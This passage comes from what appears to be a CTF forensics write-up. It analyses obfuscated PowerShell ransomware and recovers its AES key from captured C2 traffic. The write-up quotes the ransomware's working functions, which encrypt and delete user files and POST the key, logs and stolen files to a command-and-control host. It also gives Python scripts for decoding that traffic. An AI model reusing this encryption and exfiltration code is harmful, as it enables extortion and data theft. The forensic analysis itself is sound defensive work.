-t $2YngY ; $B64Logs = R64Encoder -t $RansomLogs\r\n   Invoke-WebRequest -useb \"$7CiB`:$UFX/data\" -Method POST -Body $XoX 2>&1> $null\r\n   Invoke-WebRequest -useb \"$7CiB`:$UFX/logs\" -Method POST -Body $B64Logs 2>&1> $null }\r\n```\r\n- Use `AES` on `$WiETm` with the key stored in `$Uz19o` thenstored it in `$cvf`\r\n- `$cvf` then get encoded by `R64Encoder` and stored in `$cVl` \r\n- Stored `$cVl`, `$OgE`, `$zVSza` and `$7VEq` in `$2YngY` respectively. \r\n-  Filter all strings, line that have `!` in `$Directory$slash$I26`, excluding all strings have `YagiRansom!` and logs it to `$RansomLogs`\r\n-  Encode `$2YngY` with base64 and stores it in `$XoX`\r\n-  `$RansomLogs` also got encrypted with base64 and stored in `$B64Logs`\r\n-  Send the `$XoX` to endpoint `$7CiB:$UFX/data` and `$B64Logs` to endpoint `$7CiB:$UFX/logs`\r\n#### EncryptFiles\r\n```powershell\r\nfunction EncryptFiles { \r\n   $ExcludedFiles = '*.enc', 'yaginote.txt', '*.dll', '*.ini', '*.sys', '*.exe', '*.msi', '*.NLS', '*.acm', '*.nls', '*.EXE', '*.dat', '*.efi', '*.mui'\r\n   foreach ($i in $(Get-ChildItem $Directory -recurse -exclude $ExcludedFiles | Where-Object { ! $_.PSIsContainer } | ForEach-Object { $_.FullName })) { \r\n   Invoke-AESEncryption -Key $WiETm -Path $i ; Add-Content -Path \"$Directory$slash$I26\" -Value \"[!] $i is now encrypted\" ;\r\n   Remove-Item $i }\r\n   $RansomLogs = Get-Content \"$Directory$slash$I26\" | Select-String \"[!]\" | Select-String \"YagiRansom!\" -NotMatch ; if (!$RansomLogs) { \r\n   Add-Content -Path \"$Directory$slash$I26\" -Value \"[!] No files have been encrypted!\" }}\r\n```\r\n- Create a exclusion list for the ecnryption function. \r\n- Browse through the folder and exclude all the files that have extension in the list, put the path in `$i`\r\n- Use AES on `$i` with the key is `$WiETm` and logs them in the format:  `$Directory$slash$I26\" -Value \"[!] $i is now encrypted`  \r\n- Only log the file has `!` and excluding the `YagiRansom!`\r\n#### ExfiltrateFiles\r\n```powershell\r\nfunction ExfiltrateFiles {\r\n   Invoke-WebRequest -useb \"$7CiB`:$UFX/files\" -Method GET 2>&1> $null \r\n   $RansomLogs = Get-Content \"$Directory$slash$I26\" | Select-String \"No files have been encrypted!\" ; if (!$RansomLogs) {\r\n   foreach ($i in $(Get-ChildItem $Directory -recurse -filter *.enc | Where-Object { ! $_.PSIsContainer } | ForEach-Object { $_.FullName })) {\r\n      $Pfile = $i.split($slash)[-1] ; $B64file = R64Encoder -f $i ; $B64Name = R64Encoder -t $Pfile\r\n      Invoke-WebRequest -useb \"$7CiB`:$UFX/files/$B64Name\" -Method POST -Body $B64file 2>&1> $null }}\r\n   else { $B64Name = R64Encoder -t \"none.null\" ; Invoke-WebRequest -useb \"$7CiB`:$UFX/files/$B64Name\" -Method POST -Body $B64file 2>&1> $null }}\r\n```\r\n- Sends an initial request to the C2 server at `$7CiB:$UFX/files` endpoint.\r\n- Checks if any files have been encrypted by searching for the text \"No files have been encrypted!\" in the ransom note.\r\n- If files have been encrypted:\r\n  - Finds all `.enc` files in the directory and its subdirectories.\r\n  - For each encrypted file:\r\n    - Extracts the filename using `split` with the system's path separator.\r\n    - Encodes the file content using `R64Encoder` with `-f` flag.\r\n    - Encodes the filename using `R64Encoder` with `-t` flag.\r\n    - Uploads the encoded file to the C2 server using the encoded filename in the URL path\r\n#### Main\r\n```powershell\r\nif ($Mode -eq \"-d\") { \r\n   Write-Host ; Write-Host \"[!] Shutdowning....\" -ForegroundColor Red; sleep 1 }\r\nelse {\r\n   Write-Host ;\r\n   Write-Host \"[+] Checking communication with C2 Server..\" -ForegroundColor Blue\r\n   $DCe = GetStatus ; sleep 1\r\n   $WiETm = -join ( (48..57) + (65..90) + (97..122) | Get-Random -Count 24 | % {[char]$_})\r\n   Write-Host \"[!] Encrypting ...\" -ForegroundColor Red\r\n   CreateReadme ; EncryptFiles ; if ($DCe) { SendResults ; sleep 1\r\n   if ($ENyR -eq \"-x\") { Write-Host \"[i] Exfiltrating ...\" -ForegroundColor Green\r\n      ExfiltrateFiles ; sleep 1 }}\r\n   if (!$DCe) { Write-Host \"[+] Saving logs in yaginote.txt..\" -ForegroundColor Blue }\r\n   else { Write-Host \"[+] Sending logs to C2 Server..\" -ForegroundColor Blue }}\r\n   if ($args -like \"-demo\") { RemoveWallpaper ; PopUpRansom\r\n   if ($PayNow -eq \"True\") { SendPay ; SendOK } else { SendClose ; SendOK }}\r\n   else { SendOK }\r\nsleep 1000 ; Write-Host \"[i] Done!\" -ForegroundColor Green ; Write-Host\r\n```\r\n- Create `$WiETm` randomly.\r\n- Encrypt files in `EncrypFiles`.\r\n- Use `ExfiltrateFiles` to filter and send the data.\r\n### Reversing the encryption process\r\nWe need to find the main key `$WiETm`. You can use `Ctrl` + `F` to find where `WiETm` is used in the functions.\r\n\r\nWe can see in the function `SendResults`:\r\n```powershell\r\nfunction SendResults {\r\n   $cvf = Invoke-AESEncryption -Key $Uz19o -Text $WiETm ; $cVl = R64Encoder -t $cvf\r\n   $2YngY = \"> $cVl > $OgE > $zVSza > $7VEq\"\r\n   $RansomLogs = Get-Content \"$Directory$slash$I26\" | Select-String \"[!]\" | Select-String \"YagiRansom!\" -NotMatch\r\n   $XoX = R64Encoder -t $2YngY ; $B64Logs = R64Encoder -t $RansomLogs\r\n   Invoke-WebRequest -useb \"$7CiB`:$UFX/data\" -Method POST -Body $XoX 2>&1> $null\r\n   Invoke-WebRequest -useb \"$7CiB`:$UFX/logs\" -Method POST -Body $B64Logs 2>&1> $null }\r\n```\r\n- `$WiETm` is the plaintext that gets encrypted with AES using the key `$Uz19o` and stored in `$cvf`\r\n- `$cvf` is then encoded by `R64Encoder` and stored in `$cVl`\r\n- `$cVl` is stored in `$2YngY` along with other variables\r\n- `$2YngY` is encoded with base64 and stored in `$XoX`\r\n- `$XoX` is then sent to the server\r\n\r\nThat was tiresome ~~. We got the `.pcapng` file tho, this could help us to get the data we need.\r\n#### $encrypedDataPackage ($XoX)\r\n\r\nLuckily the data was right at the beginning.\r\n\r\n![alt text](\u003C../../../assets/images/urgent-tina/2025-04-07_21-03.png)\r\n_HTTP Stream_\r\n\r\n```http\r\nPOST /data HTTP/1.1\r\nUser-Agent: Mozilla/5.0 (Windows NT; Windows NT 6.2; en-US) WindowsPowerShell/5.1.19041.1237\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: 192.168.240.1:443\r\nContent-Length: 188\r\n\r\n0IzL5AzL5_DItASOwoDMwAiPgQmb2ZWMiBHZ18Gat4Wa3BiPgI3b0Fmc0NXaulWbkFGI+AiWsZ_TkRFaupFVaNjYqZ_akpnV0RmbWVnWy40VTJjSRJ2X1cFZHZVUlhlTtQmbOBFTxQWWShFawV1V5MVUtp0STRkWxFlaORkTHZkRWRUV4ZlVOp0VnBiP\r\nHTTP/1.1 200 OK\r\nContent-Length: 69\r\nServer: Microsoft-HTTPAPI/2.0\r\nDate: Wed, 18 Sep 2024 17:09:37 GMT\r\n\r\n\u003Ch1>It Works!\u003C/h1>\u003Cp>This is the default web page for this server\u003C/p>\r\n```\r\nThe endpoint was `/data` and sent with `HTTP POST`. Thus we could see our first clue.\r\n\r\n```\r\n$encrypedDataPackage = 0IzL5AzL5_DItASOwoDMwAiPgQmb2ZWMiBHZ18Gat4Wa3BiPgI3b0Fmc0NXaulWbkFGI+AiWsZ_TkRFaupFVaNjYqZ_akpnV0RmbWVnWy40VTJjSRJ2X1cFZHZVUlhlTtQmbOBFTxQWWShFawV1V5MVUtp0STRkWxFlaORkTHZkRWRUV4ZlVOp0VnBiP\r\n```\r\n\r\n#### $combinedMetadata ($2YngY)\r\nWe got `$XoX` and `$2YngY` was encrypted with bas64 to get `$XoX`.\r\n\r\nWe could write a script to decode `$XoX` to get the data we need.\r\n\r\n```python\r\nimport base64\r\n\r\ndef reverse_decode(strings):\r\n    reversed_strings = strings[::-1]\r\n    replaced_strings = reversed_strings.replace(\"-\", \"C\").replace(\"_\", \"E\")\r\n\r\n    padding = len(replaced_strings) % 4\r\n    if padding:\r\n        replaced_strings += \"=\" * (4 - padding)\r\n    \r\n    decoded = base64.b64decode(replaced_strings)\r\n    return decoded\r\n\r\nencrypedDataPackage = \"0IzL5AzL5_DItASOwoDMwAiPgQmb2ZWMiBHZ18Gat4Wa3BiPgI3b0Fmc0NXaulWbkFGI+AiWsZ_TkRFaupFVaNjYqZ_akpnV0RmbWVnWy40VTJjSRJ2X1cFZHZVUlhlTtQmbOBFTxQWWShFawV1V5MVUtp0STRkWxFlaORkTHZkRWRUV4ZlVOp0VnBiP\"\r\ndecoded = reverse_decode(XoX)\r\nprint(decoded.decode('utf-8', errors='ignore'))\r\n```\r\n```powershell\r\npython .\\B64Reverse.py\r\n> gWJNVVxUDVFFGNDNjQqZDSKJmQS9WUphXRYd1LPNnd-NXeQVGdW5_bQJ2SWN2ZuVndtVzdhFjb3ZTZnhTdLFlZ > administrator > win-ho5dpb1fvnd > 00:09 - 19/09/24\r\n```\r\nRemember ` $combinedMetadata = \"> $encodedAesKey > $machineName > $username > $formattedDateTime\"` thus we could see that:\r\n- `$encodedAesKey`: gWJNVVxUDVFFGNDNjQqZDSKJmQS9WUphXRYd1LPNnd-NXeQVGdW5_bQJ2SWN2ZuVndtVzdhFjb3ZTZnhTdLFlZ\r\n- `$machineName`: administrator\r\n- `$username`: win-ho5dpb1fvnd\r\n- `$formattedDateTime`: 00:09 - 19/09/24\r\n\r\n#### $encryptedAesKey ($cvf)\r\nAnd `$encodedAesKey` also base64 encoded from `$encryptedAesKey`. Reuse the script to get what we need.\r\n```powershell\r\npython -u \"e:\\CTF\\UrgentTina SVATTT\\B64Reverse.py\"\r\nfQKu8ge6wn1aw5mvungcVKbPlNVtePysBvsO/WXExiQoRBbJH6jB3C4aET51USIZ\r\n```\r\n`$encryptedAesKey` was the result of the AES encryption. We need to find the key which was `$derivedKeyFromDateTime`\r\n\r\n#### $derivedKeyFromDateTime ($Uz19o)\r\n`Ctrl` + `F` with `$Uz19o` give us where we could get the value for this variable.\r\n```powershell\r\n$OgE = ([Environment]::MachineName).ToLower() ; $zVSza = ([Environment]::UserName).ToLower() ; $I26 = \"yaginote.txt\"\r\n$7VEq = Get-Date -Format \"HH:mm - dd/MM/yy\" ; $Uz19o = $7VEq.replace(\":\",\"\").replace(\" \",\"\").replace(\"-\",\"\").replace(\"/\",\"\")+$zVSza+$OgE\r\n```\r\n`$derivedKeyFromDateTime` was created from `$formattedDateTime`, `$username` and `$machineName`.\r\n- `$formattedDateTime`: Date and time when the script was executed (found earlier ` 00:09 - 19/09/24` )\r\n- `$username`: Machine name (found earlier `win-ho5dpb1fvnd`)\r\n- `$machineName`: User name (found earlier `administrator`)\r\n\r\nWe got everything now let's find `$derivedKeyFromDateTime`\r\n```python\r\ndate_time = \"00:09 - 19/09/24\" # $7VEq\r\nusername = \"win-ho5dpb1fvnd\"  # $zVSza\r\nmachine_name = \"administrator\"  # $OgE\r\n\r\nformatted_date = date_time.replace(\":\", \"\").replace(\" \", \"\").replace(\"-\", \"\").replace(\"/\", \"\")\r\nderivedKeyFromDateTime = formatted_date + username + machine_name\r\n\r\nprint(derivedKeyFromDateTime)\r\n```\r\n```powershell\r\npython -u \"e:\\CTF\\UrgentTina SVATTT\\Uz.py\"\r\n0009190924win-ho5dpb1fvndadministrator\r\n```\r\n#### $masterEncryptionKey ($WiETm)\r\nWe got all the data to find `$masterEncryptionKey` now.\r\n\r\n```python\r\nfrom Crypto.Hash import SHA256\r\nfrom Crypto.Cipher import AES\r\nimport base64\r\n\r\ndef decrypt_aes(ciphertext, key):\r\n    hashed_key = SHA256.new(key.encode('utf-8')).digest()\r\n    \r\n    enc_bytes = base64.b64decode(ciphertext)\r\n    \r\n    iv = enc_bytes[:16]\r\n    cipher_strings = enc_bytes[16:]\r\n    \r\n    cipher = AES.new(hashed_key, AES.MODE_CBC, iv)\r\n    decrypted = cipher.decrypt(cipher_strings)\r\n    \r\n    decrypted = decrypted.rstrip(b\"\\0\")\r\n    return decrypted.decode('utf-8')\r\n\r\nencryptedAesKey = \"fQKu8ge6wn1aw5mvungcVKbPlNVtePysBvsO/WXExiQoRBbJH6jB3C4aET51USIZ\" \r\nderivedKeyFromDateTime = \"0009190924win-ho5dpb1fvndadministrator\" \r\nmasterEncryptionKey = decrypt_aes(encryptedAesKey, derivedKeyFromDateTime) \r\nprint(masterEncryptionKey)\r\n```\r\n```powershell\r\npython -u \"e:\\CTF\\UrgentTina SVATTT\\AESDecrypt.py\"\r\nYaMfem0zr4jdiZsDUxv1TH69\r\n```\r\nFinally we got `$masterEncryptionKey: YaMfem0zr4jdiZsDUxv1TH69` now\r\n\r\n#### Logs \r\n\r\nWe only need to decrypt the logs that were sent to endpoint $7CiB:$UFX/logs\r\n\r\n![alt text](\u003C../../../assets/images/urgent-tina/2025-04-08_01-06.png)\r\n_HTTP Stream_\r\n\r\n```http\r\nPOST /logs HTTP/1.1\r\nUser-Agent: Mozilla/5.0 (Windows NT; Windows NT 6.2; en-US) WindowsPowerShell/5.1.19041.1237\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: 192.168.240.1:443\r\nContent-Length: 5700\r\n\r\nkVGdwlncj5WZgc3buBycpByZwpmLy_TYykjN4_jYjNWO1YTM3cjNmJmZxgjMmFWZycjN5Y2X1cTO4YDOzIjM5kzMzoHXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpByZwpmLtFmb0VWa2x1c05WZtV3YvR_XyV2cVVUScNnclNXVcpzQg0VIbB-ZlRHc5J3YuVGI39mbgMXagcGcq5iN1QzN5ATMt0WY0NXLuFWYpR3chJWZz1ycsVGelBHXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpByZuBnLtlWbcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGInBnauADM0gHMwQzXmdjYzoXLNpGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpBiZkBnLzVmc1R3YlRXaoNmch9FZuF2XzRnbl1WZylWdxVmcfNnbvlGdhJXZkl2cu92YfNWZTR1bJ9Ve0lmc1NWZz9FVvl_XzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnL581ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHdugzXnFGbmx1c05WZtV3YvR_XyV2cVVUScNnclNXVcpzQg0VIbB-ZlRHc5J3YuVGI39mbgMXagQHe05yNfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnL281ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHdukTNfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnL4UzXnFGbmx1c05WZtV3YvR_XyV2cVVUScNnclNXVcpzQg0VIbB-ZlRHc5J3YuVGI39mbgMXagQHe05yN181ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHduYTNfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnL1UzXnFGbmx1c05WZtV3YvR_XyV2cVVUScNnclNXVcpzQg0VIbB-ZlRHc5J3YuVGI39mbgMXagQHe05-N181ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHduMTNfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnLyUzXnFGbmx1c05WZtV3YvR_XyV2cVVUScNnclNXVcpzQg0VIbB-ZlRHc5J3YuVGI39mbgMXagQHe05SM181ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHduATNfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnL181ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHdukDNfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnL4QzXnFGbmx1c05WZtV3YvR_XyV2cVVUScNnclNXVcpzQg0VIbB-ZlRHc5J3YuVGI39mbgMXagQHe05yN081ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHduYDNfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnL1QzXnFGbmx1c05WZtV3YvR_XyV2cVVUScNnclNXVcpzQg0VIbB-ZlRHc5J3YuVGI39mbgMXagQHe05-N081ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHduMDNfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnLyQzXnFGbmx1c05WZtV3YvR_XyV2cVVUScNnclNXVcpzQg0VIbB-ZlRHc5J3YuVGI39mbgMXagQHe05SM081ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHduADNfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnL081ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHdukzMfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnL4MzXnFGbmx1c05WZtV3YvR_XyV2cVVUScNnclNXVcpzQg0VIbB-ZlRHc5J3YuVGI39mbgMXagQHe05yNz81ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHduYzMfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnL1MzXnFGbmx1c05WZtV3YvR_XyV2cVVUScNnclNXVcpzQg0VIbB-ZlRHc5J3YuVGI39mbgMXagQHe05-Nz81ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHduMzMfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnLyMzXnFGbmx1c05WZtV3YvR_XyV2cVVUScNnclNXVcpzQg0VIbB-ZlRHc5J3YuVGI39mbgMXagQHe05SMz81ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHduAzMfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnLz81ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHdukjMfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnL4IzXnFGbmx1c05WZtV3YvR_XyV2cVVUScNnclNXVcpzQg0VIbB-ZlRHc5J3YuVGI39mbgMXagQHe05yNy81ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHduYjMfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnL1IzXnFGbmx1c05WZtV3YvR_XyV2cVVUScNnclNXVcpzQg0VIbB-ZlRHc5J3YuVGI39mbgMXagQHe05-Ny81ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHduMjMfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnLyIzXnFGbmx1c05WZtV3YvR_XyV2cVVUScNnclNXVcpzQg0VIbB-ZlRHc5J3YuVGI39mbgMXagQHe05SMy81ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHduAjMfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnLy81ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHdukTMfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnL4_zXnFGbmx1c05WZtV3YvR_XyV2cVVUScNnclNXVcpzQg0VIbB-ZlRHc5J3YuVGI39mbgMXagQHe05yNx81ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHduYTMfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnL1_zXnFGbmx1c05WZtV3YvR_XyV2cVVUScNnclNXVcpzQg0VIbB-ZlRHc5J3YuVGI39mbgMXagQHe05-Nx81ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHduMTMfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnLy_zXnFGbmx1c05WZtV3YvR_XyV2cVVUScNnclNXVcpzQg0VIbB-ZlRHc5J3YuVGI39mbgMXagQHe05SMx81ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGI0hHduATMfdWYsZGXzRnbl1Wdj9GRcJXZzVVRJx1cyV2cVxlODBSXhsFIkVGdwlncj5WZgc3buBycpB-d4RnLx81ZhxmZcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGIn5Gcus2YhxmYcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGInBnaugzYyMTMmdzYkJWNykjMzAjMxkTY0QDMhRWY5MjNxQWYcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGInBnau42X1MjM5QzNyITO3IjN4kjN0IjM28FOzMTN4MjM4IjMwcDMzIzXzMjM4YzM4QjMcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyWgQWZ0BXeyNmblBydv5GIzlGIn5GcuQWZ1YDN4UzYjZTMxgTNkNGZhFTNzMjY4cDZ1UWYiNTMcNHduVWb1N2b_xlclNXVFl_XzJXZzVFX6M_IdFyW\r\n```\r\nThe logs were encrypted with R64Encoder so we'll reuse the script we used before.\r\n\r\n![alt text](\u003C../../../assets/images/urgent-tina/2025-04-08_01-16.png)\r\n\r\nIt's a bit hard to read, so we can modify the script a bit.\r\n\r\n```powershell\r\n python .\\B64ReverseLogs.py\r\n[!]\r\n C:\\Users\\IEUser\\Documents\\13bae5d78b3351adcd58116cc58465ed.png is now encrypted [!]\r\n C:\\Users\\IEUser\\Documents\\248368233_230702282385338_6224698627922749235_n.jpg is now encrypted [!]\r\n C:\\Users\\IEUser\\Documents\\ad1639ada044a912032925bdc7f132c8.jpg is now encrypted [!]\r\n C:\\Users\\IEUser\\Documents\\black.png is now encrypted [!]\r\n C:\\Users\\IEUser\\Documents\\flag_1.txt is now encrypted [!]\r\n C:\\Users\\IEUser\\Documents\\flag_10.txt is now encrypted [!]\r\n C:\\Users\\IEUser\\Documents\\flag_11.txt is now encrypted [!]\r\n C:\\Users\\IEUser\\Documents\\flag_12.txt is now encrypted [!]\r\n C:\\Users\\IEUser\\Documents\\flag_13.txt is now encrypted [!]\r\n C:\\Users\\IEUser\\Documents\\flag_14.txt is now encrypted [!]\r\n C:\\Users\\IEUser\\Documents\\flag_15.txt is now encrypted [!]\r\n C:\\Users\\IEUser\\Documents\\flag_16.txt is now encrypted [!]\r\n C:\\Users\\IEUser\\Documents\\flag_17.txt is now encrypted [!]\r\n C:\\Users\\IEUser\\Documents\\flag_18.txt is now encrypted [!]\r\n C:\\Users\\IEUser\\Documents\\flag_19.txt is now encrypted [!]\r\n C:\\Users\\IEUser\\Documents\\flag_2.txt is now encrypted [!]\r\n C:\\Users\\IEUser\\Documents\\flag_20.txt is now encrypted [!]\r\n C:\\Users\\IEUser\\Documents\\flag_21.txt is now encrypted [!]\r\n C:\\Users\\IEUser\\Documents\\flag_22.txt is now encrypted [!]\r\n C:\\Users\\IEUser\\Documents\\flag_23.txt is now encrypted [!]\r\n C:\\Users\\IEUser\\Documents\\flag_24.txt is now encrypted [!]\r\n C:\\Users\\IEUser\\Documents\\flag_25.txt is now encrypted [!]\r\n C:\\Users\\IEUser\\Documents\\flag_26.txt is now encrypted [!]\r\n C:\\Users\\IEUser\\Documents\\flag_27.txt is now encrypted [!]\r\n C:\\Users\\IEUser\\Documents\\flag_28.txt is now encrypted [!]\r\n C:\\Users\\IEUser\\Documents\\flag_29.txt is now encrypted [!]\r\n C:\\Users\\IEUser\\Documents\\flag_3.txt is now encrypted [!]\r\n C:\\Users\\IEUser\\Documents\\flag_30.txt is now encrypted [!]\r\n C:\\Users\\IEUser\\Documents\\flag_31.txt is now encrypted [!]\r\n C:\\Users\\IEUser\\Documents\\flag_32.txt is now encrypted [!]\r\n C:\\Users\\IEUser\\Documents\\flag_33.txt is now encrypted [!]\r\n C:\\Users\\IEUser\\Documents\\flag_34.txt is now encrypted [!]\r\n C:\\Users\\IEUser\\Documents\\flag_35.txt is now encrypted [!]\r\n C:\\Users\\IEUser\\Documents\\flag_36.txt is now encrypted [!]\r\n C:\\Users\\IEUser\\Documents\\flag_37.txt is now encrypted [!]\r\n C:\\Users\\IEUser\\Documents\\flag_38.txt is now encrypted [!]\r\n C:\\Users\\IEUser\\Documents\\flag_39.txt is now encrypted [!]\r\n C:\\Users\\IEUser\\Documents\\flag_4.txt is now encrypted [!]\r\n C:\\Users\\IEUser\\Documents\\flag_40.txt is now encrypted [!]\r\n C:\\Users\\IEUser\\Documents\\flag_41.txt is now encrypted [!]\r\n C:\\Users\\IEUser\\Documents\\flag_42.txt is now encrypted [!]\r\n C:\\Users\\IEUser\\Documents\\flag_43.txt is now encrypted [!]\r\n C:\\Users\\IEUser\\Documents\\flag_44.txt is now encrypted [!]\r\n C:\\Users\\IEUser\\Documents\\flag_45.txt is now encrypted [!]\r\n C:\\Users\\IEUser\\Documents\\flag_46.txt is now encrypted [!]\r\n C:\\Users\\IEUser\\Documents\\flag_47.txt is now encrypted [!]\r\n C:\\Users\\IEUser\\Documents\\flag_48.txt is now encrypted [!]\r\n C:\\Users\\IEUser\\Documents\\flag_49.txt is now encrypted [!]\r\n C:\\Users\\IEUser\\Documents\\flag_5.txt is now encrypted [!]\r\n C:\\Users\\IEUser\\Documents\\flag_50.txt is now encrypted [!]\r\n C:\\Users\\IEUser\\Documents\\flag_51.txt is now encrypted [!]\r\n C:\\Users\\IEUser\\Documents\\flag_52.txt is now encrypted [!]\r\n C:\\Users\\IEUser\\Documents\\flag_53.txt is now encrypted [!]\r\n C:\\Users\\IEUser\\Documents\\flag_54.txt is now encrypted [!]\r\n C:\\Users\\IEUser\\Documents\\flag_55.txt is now encrypted [!]\r\n C:\\Users\\IEUser\\Documents\\flag_56.txt is now encrypted [!]\r\n C:\\Users\\IEUser\\Documents\\flag_57.txt is now encrypted [!]\r\n C:\\Users\\IEUser\\Documents\\flag_58.txt is now encrypted [!]\r\n C:\\Users\\IEUser\\Documents\\flag_59.txt is now encrypted [!]\r\n C:\\Users\\IEUser\\Documents\\flag_6.txt is now encrypted [!]\r\n C:\\Users\\IEUser\\Documents\\flag_7.txt is now encrypted [!]\r\n C:\\Users\\IEUser\\Documents\\flag_8.txt is now encrypted [!]\r\n C:\\Users\\IEUser\\Documents\\flag_9.txt is now encrypted [!]\r\n C:\\Users\\IEUser\\Documents\\IoT_security_IoTSec_considerations_requirements_and_architectures.pdf is now encrypted [!]\r\n C:\\Users\\IEUser\\Documents\\jM-z3b7f_400x400.jpg is now encrypted [!]\r\n C:\\Users\\IEUser\\Documents\\mim.png is now encrypted [!]\r\n C:\\Users\\IEUser\\Documents\\pexels-sebastiaan-stam-1097456.jpg is now encrypted 